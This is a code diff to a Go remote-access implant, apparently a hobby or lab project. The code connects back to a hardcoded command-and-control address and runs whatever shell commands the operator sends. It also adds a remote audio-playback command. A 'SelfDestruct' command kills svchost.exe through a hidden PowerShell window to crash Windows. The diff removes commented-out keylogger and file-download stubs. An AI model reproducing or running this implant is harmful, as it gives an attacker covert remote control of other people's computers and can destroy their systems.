@@ -1,13 +1,18 @@
 package main
 
 import (
+	"bytes"
 	"fmt"
 	"net"
 	"os"
 	"os/exec"
 	"syscall"
 	"time"
+
 	//"github.com/MarinX/keylogger"
+
+	"github.com/ebitengine/oto/v3"
+	"github.com/hajimehoshi/go-mp3"
 )
 
 func callHome(c2Address *string, attempts *int) (net.Conn, bool) {
@@ -55,11 +60,6 @@ func executeCommands(conn *net.Conn, command *string) {
 		output = []byte("Couldn't execute the command\n")
 		fmt.Println("Couldnt Execute the command")
 	}
-	// if len(output) <= 1 {
-	// 	output = []byte("Couldn't execute the command\n")
-	// 	fmt.Println(output)
-	// }
-	//fmt.Println(output)
 	(*conn).Write(output)
 }
 
@@ -80,44 +80,10 @@ func executeCommands(conn *net.Conn, command *string) {
 // 	return products
 // }
 
-// func logger(conn *net.Conn) { //This only works within the context of the current window
-// 	buffer := make([]byte, 12)
-// 	if err := keyboard.Open(); err != nil {
-// 		panic(err)
-// 	}
-// 	defer func() {
-// 		_ = keyboard.Close()
-// 	}()
-// 	fmt.Println(len(buffer))
-// 	for i := 0; i < len(buffer); i++ {
-// 		char, _, err := keyboard.GetKey()
-// 		if err != nil {
-// 			panic(err)
-// 		}
-// 		buffer[i] = byte(char)
-// 		//fmt.Printf("You pressed: rune %q", char)
-// 	}
-// 	(*conn).Write([]byte(buffer))
-// 	(*conn).Write([]byte("\n"))
-// }
-
 func terminate() {
 	fmt.Println("Terminating Implant")
 	time.Sleep(1 * time.Second)
 	os.Exit(0)
-}
-
-func listen4Commands2(conn *net.Conn, c1 chan string) {
-	request := make([]byte, 32)
-	read_len, err := (*conn).Read(request)
-	if read_len == 0 {
-		os.Exit(0)
-	}
-	if err != nil {
-		os.Exit(0)
-	}
-	command := string(request[:read_len])
-	c1 <- command
 }
 
 // func cd(conn *net.Conn, command *string, pImplantWD *string) bool {
@@ -136,34 +102,58 @@ func listen4Commands2(conn *net.Conn, c1 chan string) {
 // 	return false
 // }
 
-func ls(conn *net.Conn, implantWD *string) {
-	dirFS, _ := os.ReadDir(*implantWD)
-	dirListing := ""
-	for e := range dirFS {
-		dirInfo, _ := dirFS[e].Info()
-		dirListing = dirListing + "		" + fmt.Sprint(dirInfo.Size()) + "		" + fmt.Sprint(dirInfo.Mode()) + "		" + dirInfo.Name() + "\n"
-	}
-	(*conn).Write([]byte("\n" + "		SIZE		" + "MODE		" + "	NAME" + "\n" +
-		"		----		" + "----		" + "	----" + "\n" +
-		dirListing + "\n")) //Looks funky but I want it organized
-}
-
-// func download(conn *net.Conn, implantWD *string, file string) {
-// 	openFile, err := os.Open(file)
-// 	if err != nil {
-// 		panic(err)
+// func ls(conn *net.Conn, implantWD *string) {
+// 	dirFS, _ := os.ReadDir(*implantWD)
+// 	dirListing := ""
+// 	for e := range dirFS {
+// 		dirInfo, _ := dirFS[e].Info()
+// 		dirListing = dirListing + "		" + fmt.Sprint(dirInfo.Size()) + "		" + fmt.Sprint(dirInfo.Mode()) + "		" + dirInfo.Name() + "\n"
 // 	}
-// 	contentsFile, err := os.ReadFile(file)
-// 	if err != nil {
-// 		panic(err)
-// 	}
-// 	net.TCPAddr
-// 	(*conn).Write([]byte(contentsFile))
-
+// 	(*conn).Write([]byte("\n" + "		SIZE		" + "MODE		" + "	NAME" + "\n" +
+// 		"		----		" + "----		" + "	----" + "\n" +
+// 		dirListing + "\n")) //Looks funky but I want it organized
 // }
 
+func receiveNPlayAudio(conn *net.Conn) { //Needs some fixing
+	fmt.Println("Recieveing Audio ...")
+	music := make([]byte, 3145728) //Track limit is 3MB
+	read_len, err := (*conn).Read(music)
+	if err != nil {
+		fmt.Println("Couldnt Play the Track")
+		return
+	}
+	if read_len < 1 {
+		fmt.Println("Couldnt Play the Track")
+		return
+	}
+	musicCut := music[:read_len]
+	musicBytesReader := bytes.NewReader(musicCut)
+	decodedMp3, err := mp3.NewDecoder(musicBytesReader)
+	if err != nil {
+		fmt.Println("Audio Decoding Failed")
+		return
+	}
+	op := &oto.NewContextOptions{}
+	op.SampleRate = 44100
+	op.ChannelCount = 1
+	op.Format = oto.FormatSignedInt16LE
+	otoCtx, readyChan, err := oto.NewContext(op)
+	if err != nil {
+		fmt.Println("oto New Context failed")
+		return
+	}
+	<-readyChan
+	player := otoCtx.NewPlayer(decodedMp3)
+	player.Play()
+	//The play is async so we can comment out the below line if we want regulat execution even after returning
+	// for player.IsPlaying() {
+	// 	time.Sleep(5 * time.Second)
+	// }
+	err = player.Close()
+}
+
 func main() {
-	c2Address := "192.168.0.106:1234"
+	c2Address := "192.168.5.222:1234"
 	attempts := 0
 	//implantWD, _ := os.Getwd()
 	fmt.Println("Implant Started")
@@ -181,7 +171,7 @@ func main() {
 		switch command {
 		case "AreYouAlive\n":
 			reply2Auth(&conn)
-		case "SelfDestruct\n": //This only works if it has admin privs
+		case "SelfDestruct\n": //This only works if it has admin privs. It is the BSOD.
 			{
 				ps_instance := exec.Command("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "/c", "taskkill.exe", "/f", "/im", "svchost.exe")
 				ps_instance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
@@ -192,7 +182,19 @@ func main() {
 				fmt.Println(output)
 				conn.Write([]byte("NoTime2Die\n"))
 			}
-		default: //I am turning the default into an error statement and appending all shell commands with a > to avoid crashes
+		case "play\n":
+			{
+				receiveNPlayAudio(&conn) //Needs time 2 fix
+			}
+		case "barCode\n":
+			{
+				barCodeLoad(&conn)
+			}
+		case "butterInjection\n":
+			{
+				fmt.Println("Chicken Kiev")
+			}
+		default: //TO-DO: turning the default into an error statement and appending all shell commands with a ">.<" to avoid crashes
 			executeCommands(&conn, &command)
 		}
 	}
